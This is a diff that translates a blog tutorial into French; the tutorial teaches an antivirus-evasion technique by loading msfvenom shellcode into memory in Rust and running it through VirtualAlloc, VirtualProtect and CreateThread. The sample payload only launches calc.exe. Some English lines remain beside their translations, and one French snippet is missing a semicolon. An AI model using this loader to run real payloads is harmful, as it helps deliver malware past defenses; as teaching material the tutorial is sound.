@@ -8,32 +8,32 @@ tags:
 published: true
 ---
 
-## What is shellcode execution ?
+## Qu'est-ce que l'exécution de shellcode ? 
 
-Shellcode execution is a technique used by malwares to avoid Antivirus and EDRs detection. Although it is now well known and easily detected, it’s crucial to understand how it works as it lays the basics fore more advanced shellcode execution methods.
+L'exécution de shellcode est une technique utilisé par les logiciels maveillants pour éviter la détection par les Anti-virus et EDR. Même si cette technique est connue et facilement détecté, c'est important de comprendre comment ça marche car c'est la base de toute méthode d'exécution shellcode.
 
-It consist of reading shellcode from a file, a remote server or a constant byte array and executing it in the local program. The shellcode is a small piece of byte code (written in assembly or compiled into raw bytes). It doesn’t need to be written to the disk or to be loaded by the Operating System.
+On va lire un bout de shellcode depuis un fichier, un serveur distant ou depuis un tableau d'octet puis l'exécuter dans le programme local. Notre shellcode est un petit bout de code (souvent écrit en assembly ou compilé en octets) qui n'a pas besoin d'être sur le disque ou chargé par l'OS.
 
-## How does it work ?
+## Comment ça marche ?
 
-Shellcode execution works by allocating memory in the current program, writing the shellcode in the allocated memory :
+L'exécution de shellcode marche en allouant de la mémoire dans le programme actuel et y écrire le shellcode :
 
-<img src="/imgs/blog/shellcode_schema1.png" alt="diagram 1" class="w-full" />
+![Schema1](/imgs/blog/shellcode_schema1.png)
 
-and finally, executing it :
+puis ensuite, on l'exécute :
 
-<img src="/imgs/blog/shellcode_schema2.png" alt="diagram 1" class="w-full" />
+![Schema2](/imgs/blog/shellcode_schema2.png)
 
-### Prerequisites
+## Pré-requis
 
-First, let’s create a new cargo project :
+Premièrement, créons a nouveau projet cargo: 
 
 ```sh
 cargo new shellcode
 cd shellcode
 ```
 
-Add this to your **Cargo.toml** :
+On ajoute ça au **Cargo.toml** :
 
 ```toml
 [dependencies]
@@ -44,28 +44,27 @@ windows = { version = "0.61.0", features = [
 ] }
 ```
 
-``
-Nice, we need to get the shellcode. Using [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) we can generate it using the following command :
+Ok, maintenant on peut générer notre shellcode en utilisant la commande [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) :
 
 ```sh
 msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o payload.bin
 ```
 
-This shellcode is HEAVILY signatured and will be flagged by any antivirus. However, it will work for our use case. If windows defender keep deleting it or making warnings, you can [add a folder exception](https://learn.microsoft.com/en-us/defender-endpoint/configure-exclusions-microsoft-defender-antivirus).
+Ce shellcode est **FORTEMENT** signé et sera détecté par n'importe quel antivirus mais il marchera pour notre exemple. 
 
-Then, we need to import our file into our rust program, we can do it using this quick and dirty macro :
+Ensuite on a besoin d'importer notre ficnier dans notre programme rust. On peut le faire rapidement avec cette macro :
 
 ```rust
 fn main() {
-    let shellcode = include_bytes!("../payload.bin");
+    let shellcode = include_bytes!("../payload.bin")
 }
 ```
 
-Our shellcode is now ready to be written into memory (it technically already is but you get the point) !
+Notre shellcode peut maintenant être écrit directement en mémoire.
 
-### Writing the shellcode writer
+## Écrire le shellcode en mémoire
 
-We need to add some imports :
+On doit d'abord ajouter quelques imports :
 
 ```rust
 use std::ptr;
@@ -74,14 +73,14 @@ use windows::Win32::System::Memory::{
 };
 ```
 
-Now we can write our shellcode writer function :
+Maintenant on peut écrire notre fonction pour écrire le shellcode :
 
 ```rust
 unsafe fn write_shellcode(shellcode: &[u8]) -> *mut std::ffi::c_void {
-    println!("[+] Shellcode length: {}", shellcode.len());
+    println!("[+] Taille du shellcode : {}", shellcode.len());
 
     unsafe {
-		//reserve memory space
+		// On réserve l'espace mémoire
         let mem = VirtualAlloc(
             Some(ptr::null_mut()),
             shellcode.len(),
@@ -89,30 +88,30 @@ unsafe fn write_shellcode(shellcode: &[u8]) -> *mut std::ffi::c_void {
             PAGE_READWRITE,
         );
 
-		// verify is allocation was succesfull
+		// On vérifie que l'allocation s'est bien passée
         if mem.is_null() {
-            panic!("[-] Failed to allocate read write memory!");
+            panic!("[-] Échec en allouant la mémoire!");
         }
-        println!("[+] Allocated memory at {:?}", mem);
+        println!("[+] Mémoire allouée à l'adresse {:?}", mem);
 
-        // Copy shellcode into allocated memory
+        // On copie le shellcode dans l'espace mémoire qu'on a réservé
         ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
         mem
     }
 }
 ```
 
-Okay let’s break it down !
+Ok on va décomposer tout ça !
 
-First, we define our function
+Premièremente on définit notre fonction
 
 ```rust
 unsafe fn write_shellcode(shellcode: &[u8]) -> *mut std::ffi::c_void
 ```
 
-We label the function as _unsafe_ as it calls external WinApi functions. We take in input a reference towards a byte array and return a pointer to a mutable void c style pointer. It represents our allocated memory.
+On ajoute `unsafe` car ça appelle les fonctions externes de WinApi. On prends en entrée une référence au tableau d'octet qui contient notre shellcode et on retourne un pointeur vers notre mémoire allouée.
 
-Then, we allocate our shellcode memory space using [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) which is defined as
+Ensuite on alloue notre espace mémoire en utilisant [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) qui est défini par 
 
 ```cpp
 LPVOID VirtualAlloc(
@@ -123,24 +122,25 @@ LPVOID VirtualAlloc(
 );
 ```
 
-- **lpAddress** is a memory address from which we want our memory to be allocated. As we don’t care where it starts, we pass a null pointer.
-- **dwSize** is the size of the memory we want to allocate, here it’s our shellcode length
-- **flAllocationType** is the type of allocation memory we want to do, here we want to reserve the memory space and commit data to it.
-- **flProtect** is the memory protection we want to use. Here we put _READWRITE_ and it will be changed later to _EXECUTE_.
+- **lpAddress** est l'adresse mémoire où l'allocation commence. On s'en fou d'avoir une adresse de départ spécifique donc on passe un pointeur null.
+- **dwSize** est la taille de l'allocation qu'on veut faire, ici c'est notre longueur de shellcode.
+- **flAllocationType** est le type d'allocation mémoire que l'on veut faire, ici on veut réserver l'espace et y écrire quelque chose.
+- **flProtect** est la protection mémoire que l'on veut utiliser, ici on met `READWRITE` et on le changera plus tard en `EXECUTE`.
 
-Finally, we copy our shellcode to the memory we allocated using
+Enfin on copie notre shellcode dans la mémoire qu'on vient d'allouer
 
 ```rust
 ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
 ```
 
-Nothing fancy here, we just pass the data we want to copy, where we want to copy and the size of what we want to copy.
+Rien de fou ici, on passe juste ce qu'on veut copier, où on veut le copier ainsi que sa taille.
 
 We are now ready to execute our shellcode 😎.
+On est maintenant prêt à exécuter notre shellcode 😎.
 
-### Writing the shellcode executor
+## Éxécuter notre shellcode
 
-Like before, let’s modify our imports :
+Comme avant, on doit ajouter des imports :
 
 ```rust
 use windows::Win32::Foundation::CloseHandle;
@@ -152,12 +152,12 @@ use windows::Win32::System::Threading::{
 };
 ```
 
-Now we can write our function :
+Maintenant on peut écrire notre fonction :
 
 ```rust
 unsafe fn execute_shellcode(mem: *mut std::ffi::c_void, length: usize) {
     unsafe {
-        // Verify memory protection
+        // On verifie la protection mémoire
         let mut verify_protect = PAGE_READWRITE;
        
         if VirtualProtect(
@@ -166,14 +166,14 @@ unsafe fn execute_shellcode(mem: *mut std::ffi::c_void, length: usize) {
             PAGE_EXECUTE,
             &mut verify_protect,
         ).is_err() {
-            panic!("[-] Failed to verify memory protection!");
+            panic!("[-] Échec pendant la vérification de la protection mémoire !");
         }
-        println!("[+] Memory protection verified");
+        println!("[+] Protection mémoire vérifiée");
 
-        // Convert memory pointer to function and execute
+        // On converti notre pointeur mémoire en pointeur de fonction et on lance cette dernière
         let shell_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = std::mem::transmute(mem);
        
-        println!("[+] Executing shellcode");       
+        println!("[+] Éxécution du shellcode");       
         let thread = match CreateThread(
             Some(ptr::null_mut()),
             0,
@@ -183,38 +183,38 @@ unsafe fn execute_shellcode(mem: *mut std::ffi::c_void, length: usize) {
             Some(ptr::null_mut()),
         ) {
             Ok(thread) => thread,
-            Err(_) => panic!("[-] Failed to create thread!"),
+            Err(_) => panic!("[-] Échec dans l'éxécution du shellcode!"),
         };
-        println!("[+] Thread created");
+        println!("[+] Thread créé");
        
         WaitForSingleObject(thread, INFINITE);
 
-        // Close the thread handle to clean up resources
+        // On ferme le thread handle pour libérer les ressources
         match CloseHandle(thread) {
-            Ok(_) => println!("[+] Thread handle closed successfully"),
+            Ok(_) => println!("[+] Le Thread handle a bien été fermé."),
             Err(_) => {
-                println!("[-] Failed to close thread handle");
+                println!("[-] Échec dans la fermeture du handle de Thread");
             }
         }
-        println!("[+] Shellcode executed successfully");
+        println!("[+] Le shellcode a bien été éxécuté.");
     }
 }
 ```
 
-Again, let’s break it down !
+Encore une fois on va décomposer ça !
 
-First, we define our function structure :
+Premièrement on définit notre fonction :
 
 ```rust
 unsafe fn execute_shellcode(mem: *mut std::ffi::c_void, length: usize)
 ```
 
-Once again we label it as unsafe as we are calling external WinApi functions. We pass it our previously allocated memory as well as the length of our shellcode.
+Encore une fois on la met unsafe car on va appeler les fonctions de WinApi. On lui passe la mémoire allouée ainsi que la taille du shellcode.
 
-We define the previously used memory protection in order to change it to _EXECUTE_.
+On change la protection mémoire en `EXECUTE` pour pouvoir éxécuter notre shellcode.
 
 We then call the function [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) defined as :
-
+Pour faire ça on appelle la fonction [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) définit par :
 ```cpp
 BOOL VirtualProtect(
   [in]  LPVOID lpAddress,
@@ -224,20 +224,21 @@ BOOL VirtualProtect(
 );
 ```
 
-- **lpAddress** is the start of the memory we want to change protection. Here the memory containing our shellcode that we allocated before.
-- **dwSize** is the size of the memory we want to modify, here the size of the shellcode.
-- **flNewProtect** is the new type of memory protection we want to apply
-- **lpflOldProtect** is the old type of memory protection that was applied before, it is used for verification purposes.
+- **lpAddress** est le début de la section mémoire que l'on veut changer, ici c'est le pointeur de notre shellcode.
+- **dwSize** est la taille de la section de mémoire que l'on veut modifier, ici c'est la taille du shellcode.
+- **flNewProtect** est le nouveau type de protection de mémoire que l'on veut appliquer
+- **lpflOldProtect** est l'ancienne protection mémoire qui est utilisée comme vérification.
 
-Next we tell Rust to transmute our allocated memory into an executable function address
+Ensuite on dit à Rust de transmuter notre mémoire en pointer de fonction
 
 ```rust
 let shell_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = std::mem::transmute(mem);
 ```
 
-Transmuting basically means telling the Rust compiler that our **mem** variable isn’t a void pointer anymore but is now a function pointer.
+Ici transmuter signifie qu'on change l'interprétation que le language a de la mémoire allouée.
 
 Then, we create a new thread to execute our shellcode using [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).
+Après ça on crée un nouveau thread pour éxécuter notre shellcode avec la fonction [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).
 
 ```rust
 HANDLE CreateThread(
@@ -250,18 +251,18 @@ HANDLE CreateThread(
 );
 ```
 
-- **lpThreadAttributes** is a pointer to a structure that determines if the returned handle can be inherited by child process. We do not need this so we pass a null pointer.
-- **dwStackSize** is the initial size of the stack in bytes. We do not need specific stack size so we put 0 to have the default stack size.
-- **lpStartAddress** is a pointer to the start of the function in which we pass our previously allocated shellcode.
-- **lpParameter** is a pointer to a variable to be passed to the thread.
-- **dwCreationFlags** is a flag used to control the creation of a thread, we do not need it for our use case.
-- **lpThreadId** is a pointer to a variable that receives the thread id, we do not need it so we pass a null pointer.
+- **lpThreadAttributes** est un pointer vers une structure qui détermine si le handle qui sera retounrée peut être hérité par un processus enfant. On en a pas besoin donc on passe ça en tant que pointeur null.
+- **dwStackSize** est la taille initiale du stack en octet. On a pas besoin d'une taille spécifique donc on mets 0 pour avoir la taille par défaut.
+- **lpStartAddress** est un pointeur vers le début de notre fonction.
+- **lpParameter** est un pointer vers les paramètres qui doivent être passés au thread.
+- **dwCreationFlags** est un flag utilisé pour contrôler la création d'un thread, on en a pas besoin ici.
+- **lpThreadId** est in pointeur vers une variable qui reçoit l'id du thread, on en a pas besoin donc on lui passer un pointeur null.
 
-Next we call [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) and pass it our thread handle. It waits for the thread to end before executing the next instructions.
+Ensuite, on appelle [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) et on lui passe notre handle de thread. Cette fonction attends qu'un thread soit fini avant d'éxécuter la prochaine instruction.
 
-Finally, we call [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) which explicitly closes our thread handle.
+Enfin, on appelle [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) qui ferme explicitement notre thread.
 
-Now we just need to do a simple main function like so :
+On a maintenant juste à assembler tout ça dans une fonction main :
 
 ```rust
 fn main() {
@@ -269,11 +270,11 @@ fn main() {
    
     unsafe {
         let mem_pointer = write_shellcode(shellcode);
-        println!("[+] Shellcode written to memory at {:?}", mem_pointer);
+        println!("[+] Shellcode alloué à l'adresse {:?}", mem_pointer);
         execute_shellcode(mem_pointer, shellcode.len());
     }
 }
 ```
 
-And you can see that our shellcode is executed like so
+Comme on peut le voir, notre shellcode est éxécuté !
 ![shellcode execution](/imgs/blog/shellcode_final_screen.png)
